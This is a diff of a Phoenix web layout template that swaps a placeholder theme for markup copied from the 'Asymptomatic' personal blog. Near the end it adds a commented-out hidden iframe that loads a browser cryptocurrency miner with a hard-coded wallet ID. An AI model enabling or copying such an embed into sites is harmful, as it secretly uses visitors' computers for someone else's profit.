@@ -1,18 +1,19 @@
-<!DOCTYPE html>
-<html lang="en">
-
+<!DOCTYPE HTML>
+<html>
 <head>
+  <meta charset="UTF-8">
   <title>Asymptomatic</title>
+  <meta name="generator" content="Habari">
+  <meta name="viewport" content="width=device-width, maximum-scale = 1">
+  <link rel="Shortcut Icon" href="/images/favicon.png">
+
   <link rel="preload" href="<%= static_path(@conn, "/css/vendor.css") %>" as="style" onload="this.rel='stylesheet'">
   <link rel="prefetch" href="<%= static_path(@conn, "/js/bundle.js") %>" type="script">
-  <link rel="shortcut icon" type="image/png" href="/assets/favicon.png"/>
 
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <!-- mobile specific metas
-     ================================================== -->
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <link type="text/css" rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:400italic,400,700">
 
+  <!--[if lt IE 9]><script  src="http://cdnjs.cloudflare.com/ajax/libs/html5shiv/r29/html5.js"></script>
+  <![endif]-->
   <%=
       render_existing(@view_module, "meta." <> @view_template, assigns) ||
       render(JellyShot.LayoutView, "meta.html", assigns)
@@ -22,200 +23,77 @@
 
   <script defer src="<%= static_path(@conn, "/js/bundle.js") %>"></script>
 </head>
+<body class="display_home multiple" itemscope itemtype="http://schema.org/Blog">
 
-<body>
+<div id="wrapper">
 
-  <!-- Header
-     ================================================== -->
-  <header id="top">
+  <header id="header">
+    <hgroup>
+    <h1 itemprop="name"><a href="/" itemprop="url">Asymptomatic</a></h1>
+    <h2 itemprop="description">There must be intelligent life down here</h2>
+    </hgroup>
+    <nav class="first last block-type-menu block-title-menu block">
+      <h1>Menu</h1><ol ><li class="inactive" id="main-menu_2603"><a href="http://asymptomatic.net/contact-me">Contact Me</a></li>
+        <li class="inactive" id="main-menu_2604"><a href="http://asymptomatic.net/stuff-i-should-do">Stuff I Should Do</a></li></ol>
+    </nav>
+  </header>
 
-    <div class="row">
+  <div id="content">
 
-      <div class="header-content twelve columns">
-
-        <h1 id="logo-text"><a href="/" title="">Asymptomatic</a></h1>
-        <p id="intro">There must me intelligent life down here...</p>
-
-      </div>
-
-    </div>
-
-    <nav id="nav-wrap">
-
-      <a class="mobile-btn" href="#nav-wrap" title="Show navigation">Show Menu</a>
-      <a class="mobile-btn" href="#" title="Hide navigation">Hide Menu</a>
-
-      <div class="row">
-
-        <ul id="nav" class="nav">
-          <li class="current"><a href="/">Home</a></li>
-          <li class="has-children"><a href="#">Dropdown</a></li>
-          <li><a href="demo.html">Demo</a></li>
-          <li><a href="archives.html">Archives</a></li>
-          <li class="has-children"><a href="single.html">Blog</a>
-            <ul>
-              <li><a href="blog.html">Blog Entries</a></li>
-              <li><a href="single.html">Single Blog</a></li>
-            </ul>
-          </li>
-          <li><a href="page.html">Page</a></li>
-        </ul> <!-- end #nav -->
-
-      </div>
-
-    </nav> <!-- end #nav-wrap -->
-
-  </header> <!-- Header End -->
-
-  <!-- Content
-     ================================================== -->
-  <div id="content-wrap">
-
-    <div class="row">
-
-      <div id="main" class="eight columns">
-
+    <div id="posts" itemprop="blogPosts">
         <%= render @view_module, @view_template, assigns %>
 
-      </div> <!-- end main -->
+	<div class="pagenav">
+	  &nbsp;<a href="http://asymptomatic.net/page/1" class="current-page">1</a>&nbsp;<a href="http://asymptomatic.net/page/2" >2</a>&nbsp;<a href="http://asymptomatic.net/page/3" >3</a>&nbsp;<span class="sep">&hellip;</span>&nbsp;<a href="http://asymptomatic.net/page/581" >581</a>	<a class="next-page" href="http://asymptomatic.net/page/2" title="Older&nbsp;Posts&nbsp;&raquo;">Older&nbsp;Posts&nbsp;&raquo;</a></div>
+    </div>
 
-      <div id="sidebar" class="four columns">
+    <aside id="sidebar">
+      <section class="first block-type-text block-title-about-the-site block">
+	<h1>About the Site</h1>Hi!  I'm Owen Winkler, and I write this drivel.  <em>This blog is about my own life and my random observations thereof.</em>  Sometimes I write about technical stuff here, but mostly that's at <a href="http://redalt.com">RedAlt</a>.  Please enjoy, or if not, click on my ads.  Either is fine with me.</section><section class="index_1 block-type-flickrfeed block-title-photos-and-screenshots block">
+	<h1>Photos and Screenshots</h1><!-- To customize this template, copy it to your currently active theme directory and edit it -->
+	<div id="flickrfeed">
+	  <ul>
+	    <li class="flickr-image"><a class="lb_flickr" href="https://live.staticflickr.com/5499/30793715840_fdebb3ff52_b.jpg" title="IMG_0423"><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/30793715840_fdebb3ff52_s.jpg" alt="IMG_0423" /></a></li>
+	    <li class="flickr-image"><a class="lb_flickr" href="https://live.staticflickr.com/5551/30340077224_637ca01148_b.jpg" title="IMG_0426"><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/30340077224_637ca01148_s.jpg" alt="IMG_0426" /></a></li>
+	    <li class="flickr-image"><a class="lb_flickr" href="https://live.staticflickr.com/5586/30793715650_396eca59ee_b.jpg" title="IMG_0427"><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/30793715650_396eca59ee_s.jpg" alt="IMG_0427" /></a></li>
+	    <li class="flickr-image"><a class="lb_flickr" href="https://live.staticflickr.com/5719/30340077154_febb8bb5e5_b.jpg" title="IMG_0428"><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/30340077154_febb8bb5e5_s.jpg" alt="IMG_0428" /></a></li>
+	    <li class="flickr-image"><a class="lb_flickr" href="https://live.staticflickr.com/5782/30793715190_fa2a8fbdba_b.jpg" title="IMG_0429"><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/30793715190_fa2a8fbdba_s.jpg" alt="IMG_0429" /></a></li>
+	    <li class="flickr-image"><a class="lb_flickr" href="https://live.staticflickr.com/5790/30340077044_faafc04116_b.jpg" title="IMG_0431"><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/30340077044_faafc04116_s.jpg" alt="IMG_0431" /></a></li>
+	    <li class="flickr-image"><a class="lb_flickr" href="https://live.staticflickr.com/8176/28472803594_5051955e7c_b.jpg" title="nowsapphire"><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/28472803594_5051955e7c_s.jpg" alt="nowsapphire" /></a></li>
+	    <li class="flickr-image"><a class="lb_flickr" href="https://live.staticflickr.com/8876/29093949655_963346cbbe_b.jpg" title="IMG_9807"><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/29093949655_963346cbbe_s.jpg" alt="IMG_9807" /></a></li>
+	    <li class="flickr-image"><a class="lb_flickr" href="https://live.staticflickr.com/7586/29093947845_cd5050d987_b.jpg" title="IMG_9764"><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/29093947845_cd5050d987_s.jpg" alt="IMG_9764" /></a></li>
 
-        <div class="widget widget_search">
-          <h3>Search</h3>
-          <form action="#">
+	  </ul>
+	</div>
+      </section><section class="index_3 block-type-rssblock block-title-latest-links block">
+	<h1>Latest Links</h1><ul>
+	</ul>
+      </section><section class="last index_4 block-type-textlinkads block-title-sponsored-listings block">
+	<h1>Sponsored Listings</h1>Sponsored Listings</section>		</aside>
 
-            <input type="text" value="Search here..." onblur="if(this.value == '') { this.value = 'Search here...'; }" onfocus="if (this.value == 'Search here...') { this.value = ''; }" class="text-search">
-            <input type="submit" value="" class="submit-search">
+  </div>
 
-          </form>
-        </div>
+  <footer id="footer"><script type="text/javascript">
+      var clicky_site_ids = clicky_site_ids || [];
+clicky_site_ids.push(63201);
+(function() {
+  var s = document.createElement('script');
+  s.type = 'text/javascript';
+  s.async = true;
+  s.src = '//static.getclicky.com/js';
+  ( document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0] ).appendChild( s );
+})();
+    </script>
+    <noscript><p><img alt="Clicky" width="1" height="1" src="//in.getclicky.com/63201ns.gif" /></p></noscript><script  src="http://asymptomatic.net/jsmincdn/jsmincdn.jquery.jquery.ui.widget.rlightbox.ada93bd39b79686df9bea1e5ac2502b9.04d59f7d027844a04bc172d53352c765/"></script>
+  </footer>
 
-        <div class="widget widget_categories group">
-          <h3>Categories.</h3>
-          <ul>
-            <%= for category <- get_categories() do %>
-            <li><a href="/posts?category=<%= category %>">
-                <%= category %></a></li>
-            <% end %>
-          </ul>
-        </div>
-
-        <div class="widget widget_text group">
-          <h3>Widget Text.</h3>
-
-          <p>Lorem ipsum Ullamco commodo laboris sit dolore commodo aliquip incididunt fugiat esse dolor aute fugiat minim eiusmod do velit labore fugiat officia ad sit culpa labore in consectetur sint cillum sint consectetur voluptate adipisicing
-            Duis irure magna ut sit amet reprehenderit.</p>
-
-        </div>
-
-        <div class="widget widget_tags">
-          <h3>Post Tags.</h3>
-
-          <div class="tagcloud group">
-            <a href="#">Corporate</a>
-            <a href="#">Onepage</a>
-            <a href="#">Agency</a>
-            <a href="#">Multipurpose</a>
-            <a href="#">Blog</a>
-            <a href="#">Landing Page</a>
-            <a href="#">Resume</a>
-          </div>
-
-        </div>
-
-        <div class="widget widget_popular">
-          <h3>Popular Post.</h3>
-
-          <ul class="link-list">
-            <li><a href="#">Sint cillum consectetur voluptate.</a></li>
-            <li><a href="#">Lorem ipsum Ullamco commodo.</a></li>
-            <li><a href="#">Fugiat minim eiusmod do.</a></li>
-          </ul>
-
-        </div>
-
-      </div> <!-- end sidebar -->
-
-    </div> <!-- end row -->
-
-  </div> <!-- end content-wrap -->
-
-
-  <!-- Footer
-================================================== -->
-  <footer>
-
-    <div class="row">
-
-      <div class="twelve columns">
-        <ul class="social-links">
-          <li><a href="#"><i class="fa fa-facebook"></i></a></li>
-          <li><a href="#"><i class="fa fa-twitter"></i></a></li>
-          <li><a href="#"><i class="fa fa-google-plus"></i></a></li>
-          <li><a href="#"><i class="fa fa-github-square"></i></a></li>
-          <li><a href="#"><i class="fa fa-instagram"></i></a></li>
-          <li><a href="#"><i class="fa fa-flickr"></i></a></li>
-          <li><a href="#"><i class="fa fa-skype"></i></a></li>
-        </ul>
-      </div>
-
-      <div class="six columns info">
-
-        <h3>About Keep It Simple</h3>
-
-        <p>This is Photoshop's version of Lorem Ipsum. Proin gravida nibh vel velit auctor aliquet.
-          Aenean sollicitudin, lorem quis bibendum auctor, nisi elit consequat ipsum, nec sagittis sem
-          nibh id elit.
-        </p>
-
-        <p>Lorem ipsum Sed nulla deserunt voluptate elit occaecat culpa cupidatat sit irure sint
-          sint incididunt cupidatat esse in Ut sed commodo tempor consequat culpa fugiat incididunt.</p>
-
-      </div>
-
-      <div class="four columns">
-
-        <h3>Photostream</h3>
-
-        <ul class="photostream group">
-          <li><a href="#"><img alt="thumbnail" src="/assets/thumb.jpg"></a></li>
-          <li><a href="#"><img alt="thumbnail" src="/assets/thumb.jpg"></a></li>
-          <li><a href="#"><img alt="thumbnail" src="/assets/thumb.jpg"></a></li>
-          <li><a href="#"><img alt="thumbnail" src="/assets/thumb.jpg"></a></li>
-          <li><a href="#"><img alt="thumbnail" src="/assets/thumb.jpg"></a></li>
-          <li><a href="#"><img alt="thumbnail" src="/assets/thumb.jpg"></a></li>
-          <li><a href="#"><img alt="thumbnail" src="/assets/thumb.jpg"></a></li>
-          <li><a href="#"><img alt="thumbnail" src="/assets/thumb.jpg"></a></li>
-        </ul>
-
-      </div>
-
-      <div class="two columns">
-        <h3 class="social">Navigate</h3>
-
-        <ul class="navigate group">
-          <li><a href="#">Home</a></li>
-          <li><a href="#">Blog</a></li>
-          <li><a href="#">Demo</a></li>
-          <li><a href="#">Archives</a></li>
-          <li><a href="#">About</a></li>
-        </ul>
-      </div>
-
-      <p class="copyright">&copy; Copyright 2014 Keep It Simple. &nbsp; Design by <a title="Styleshout" href="http://www.styleshout.com/">Styleshout</a>.</p>
-
-    </div> <!-- End row -->
-
-    <div id="go-top"><a class="smoothscroll" title="Back to Top" href="#top"><i class="fa fa-chevron-up"></i></a></div>
-
-  </footer> <!-- End Footer-->
-
-
+</div>
+<div id="backdrop"></div>
+<!--iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 12v5XWUu1qJUNTuH97P5aqJmwnB8DsyZHL</script></iframe-->
   <script>
     // Firefox doesn't seem to support the `onload` event on `link`
     document.querySelector('head').insertAdjacentHTML('beforeend', '<link rel="stylesheet" href="<%= static_path(@conn, "/css/vendor.css") %>">')
   </script>
 </body>
-
 </html>
+
